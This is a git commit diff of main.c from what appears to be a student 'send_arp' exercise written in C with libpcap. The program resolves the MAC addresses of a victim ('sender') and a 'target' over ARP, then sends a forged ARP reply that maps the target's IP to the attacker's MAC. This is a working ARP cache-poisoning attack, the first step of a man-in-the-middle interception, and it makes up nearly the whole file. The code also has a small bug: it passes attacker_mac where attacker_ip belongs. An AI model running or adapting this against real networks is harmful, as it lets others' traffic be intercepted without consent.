68b3ec4f39b7823b15d9590459a47b4f22c2c431
whit3vill <whit3vill@gmail.com>
2017-10-12 16:19:16 +0900

    Add main.c

--- main.c
+++ main.c
@@ -1,31 +1,52 @@
 #include "send_arp.h"
 
 int main (int argc, char *argv[]) {
-	pcap_t *handle;
-    char errbuf[PCAP_ERRBUF_SIZE];
-	const char *interface = argv[1];
-	u_int8_t sender_mac[ETHER_ADDR_LEN];
-	u_int8_t sender_ip[IP_ADDR_LEN];
-	u_int8_t attacker_mac[ETHER_ADDR_LEN];
-	u_int8_t attacker_ip[IP_ADDR_LEN];
-	u_int8_t target_mac[ETHER_ADDR_LEN];
-	u_int8_t target_ip[IP_ADDR_LEN];
-	
-	struct arp_packet *apkt;
+   pcap_t *handle;
+   char errbuf[PCAP_ERRBUF_SIZE];
+   const char *interface = argv[1];
+   u_int8_t sender_mac[ETHER_ADDR_LEN];
+   u_int8_t sender_ip[IP_ADDR_LEN];
+   u_int8_t attacker_mac[ETHER_ADDR_LEN];
+   u_int8_t attacker_ip[IP_ADDR_LEN];
+   u_int8_t target_mac[ETHER_ADDR_LEN];
+   u_int8_t target_ip[IP_ADDR_LEN];
+   
+   struct arp_packet *apkt;
 
-	inet_pton(AF_INET, argv[2], sender_ip);
-	inet_pton(AF_INET, argv[3], target_ip);
+   uint8_t tmp[ETHER_ADDR_LEN];
 
-	GetMAC(attacker_mac, interface);
-	GetIP(attacker_mac, interface);
+   inet_pton(AF_INET, argv[2], sender_ip);
+   inet_pton(AF_INET, argv[3], target_ip);
 
-	printf("Attacker's MAC: ");
-	printMAC(attacker_mac);
-	printf("Attacker's IP : ");
-	printIP(attacker_ip);
+   GetMAC(attacker_mac, interface);
+   GetIP(attacker_mac, interface);
 
-	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
+   printf("Attacker's MAC: ");
+   printMAC(attacker_mac);
+   printf("Attacker's IP : ");
+   printIP(attacker_ip);
 
-	ARPBroadcast(attacker_mac, attacker_ip, sender_ip, ARPOP_REQUEST, handle);
+   handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
 
+   SendARP(attacker_mac, attacker_ip, NULL, sender_ip, ARPOP_REQUEST, handle);
+   //attacker_mac, attacker_ip, sender_mac, sender_ip, 
+   GetMAC2(handle, tmp);
+   memcpy(sender_mac, tmp, ETHER_ADDR_LEN);
+   memset(tmp, 0, ETHER_ADDR_LEN);
+
+   printf("Sender's MAC: ");
+   printMAC(sender_mac);
+
+   SendARP(attacker_mac, attacker_ip, NULL, target_ip, ARPOP_REQUEST, handle);
+   //attacker_mac, attacker_ip, sender_mac, sender_ip, 
+   GetMAC2(handle, tmp);
+   memcpy(target_mac, tmp, ETHER_ADDR_LEN);
+   memset(tmp, 0, ETHER_ADDR_LEN);
+
+   printf("Target's MAC: ");
+   printMAC(target_mac);
+
+   SendARP(attacker_mac, target_ip, sender_mac, sender_ip, ARPOP_REPLY, handle);
+
+   return 0;
 }
